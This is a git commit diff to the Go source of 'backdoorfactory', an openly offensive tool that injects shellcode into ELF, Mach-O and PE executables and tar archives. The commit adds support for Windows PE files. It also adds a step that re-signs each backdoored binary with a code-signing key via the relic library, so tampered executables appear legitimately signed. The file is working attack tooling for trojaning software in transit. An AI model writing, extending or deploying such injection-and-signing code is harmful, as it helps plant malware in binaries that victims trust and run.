68cd71d412d96a604369c27211109500b363625f
k <k@k.loo>
2021-08-12 17:33:46 -0400

    signing

--- main.go
+++ main.go
@@ -20,27 +20,77 @@ import (
 	"github.com/Binject/binjection/bj"
 	"github.com/Binject/shellcode"
 	"github.com/h2non/filetype"
+	"github.com/sassoftware/relic"
+	"github.com/sassoftware/relic/cmdline/token"
 )
+func writeRelicConfig() {
 
+	//err := nil
+	mydir, err := os.Getwd()
+    if err != nil {
+        fmt.Println(err)
+    }
+
+	src, err := os.Open(filepath.Join(mydir, "relic.yml"))
+	if err != nil {
+		log.Fatal(err)
+		
+	}
+
+	
+	defer src.Close()
+
+	homedir, err := os.UserHomeDir()
+    if err != nil {
+        log.Fatal( err )
+    }
+
+	//path := homedir+ "/.config/relic"
+
+
+	os.MkdirAll(filepath.Join(homedir, ".config", "relic"), 0777)
+	if err != nil {
+        log.Fatal( err )
+    }
+	dst, err := os.Create(filepath.Join(homedir, ".config", "relic", "relic.yml")) // dir is directory where you want to save file.
+	if err != nil {
+		log.Fatal(err)
+		
+	}
+	defer dst.Close()
+	if _, err = io.Copy(dst, src); err != nil {
+		log.Fatal(err)
+		
+	}
+
+
+	
+
+}
 func main() {
+
 	dir, err := os.Getwd()
 	if err != nil {
 		log.Fatal(err)
 	}
-	parser := argparse.NewParser("backdoorfactory", "Backdoor Factory 2020")
+	parser := argparse.NewParser("backdoorfactory", "Backdoor Factory 2021")
 	scDir := parser.String("d", "shelldir", &argparse.Options{Required: true,
 		Default: filepath.Join(dir, "shellcode"), Help: "Shellcode Directory"})
+
 	cwd := parser.String("c", "cwd", &argparse.Options{Required: false,
 		Default: dir, Help: "Working Directory"})
 
 	initMode := parser.Flag("i", "init", &argparse.Options{Required: false,
-		Help: "Create the empty shellcode directories and quit"})
+		Help: "Create the empty shellcode directories, write the relic.yml config file to disk, and quit"})
 
 	// One-Shot Mode is for testing injections locally
 	testfile := parser.String("t", "testfile", &argparse.Options{Required: false,
 		Help: "File to inject into (oneshot test mode)"})
 	outfile := parser.String("o", "out", &argparse.Options{Required: false,
 		Help: "Output file (oneshot test mode)"})
+	// relic config directory
+	//rcDir := parser.String("r", "relicconfigdir", &argparse.Options{Required: true,
+	//		Default: filepath.Join(dir, "relicconfig"), Help: "Specify relic config location. If you don't specify, one will be made for you in ~/.config/relic"})
 
 	if err := parser.Parse(os.Args); err != nil {
 		log.Println(parser.Usage(err))
@@ -51,10 +101,17 @@ func main() {
 	}
 
 	repo := shellcode.NewRepo(*scDir)
+	writeRelicConfig()
+
 	if *initMode {
-		log.Println("Shellcode Directories Initialized, copy shellcode files with .bin extensions into each directory.")
+		log.Println("Shellcode Directories Initialized, copy shellcode files with .bin extensions into each directory.\n Also edit the relic config in this folder to include the paths to your keys. relic.yml in this folder is copied to $HOME/.config/relic/relic.yml on every launch")
 		return
 	}
+
+	
+
+
+
 	config := &bj.BinjectConfig{Repo: repo, CodeCaveMode: false}
 
 	if *testfile != "" { // One-shot test mode
@@ -116,6 +173,9 @@ func Inject(dry *bytes.Buffer, config *bj.BinjectConfig) (wet *bytes.Buffer, err
 	case "x-executable":
 		return injectIfBinary(dry, config)
 
+	case "vnd.microsoft.portable-executable":
+		return injectIfBinary(dry, config)
+		
 	case "x-tar":
 		return injectTar(dry, config)
 
@@ -249,22 +309,31 @@ func injectIfBinary(dry *bytes.Buffer, config *bj.BinjectConfig) (*bytes.Buffer,
 	if err != nil {
 		return nil, err
 	}
-	os := api.Windows
+	newos := api.Windows
 	switch bintype {
 	case bj.MACHO:
-		os = api.Darwin
+		newos = api.Darwin
 	case bj.ELF:
-		os = api.Linux
+		newos = api.Linux
 	case bj.PE:
-		os = api.Windows
+		newos = api.Windows
 	}
 	// todo: detect 32 vs 64 bit, for now just default to 64
 
-	scdata, err := config.Repo.Lookup(os, api.Intel64, "*.bin")
+	scdata, err := config.Repo.Lookup(newos, api.Intel64, "*.bin")
 	if err != nil {
 		return nil, err
 	}
 
 	b, err := bj.Binject(dry.Bytes(), scdata, config)
-	return bytes.NewBuffer(b), err
+
+	//Initialize the parts of the cobra command that aren't called unless you run from command line.
+	//since relic is a cobracommand project, there are a bunch of values that must be initialized per signature
+
+	relic.SpinUp()
+
+	//sign the bytestream. This creates a temporary file and signs
+	b2 := token.SpecialSign(b)
+
+	return bytes.NewBuffer(b2), err
 }
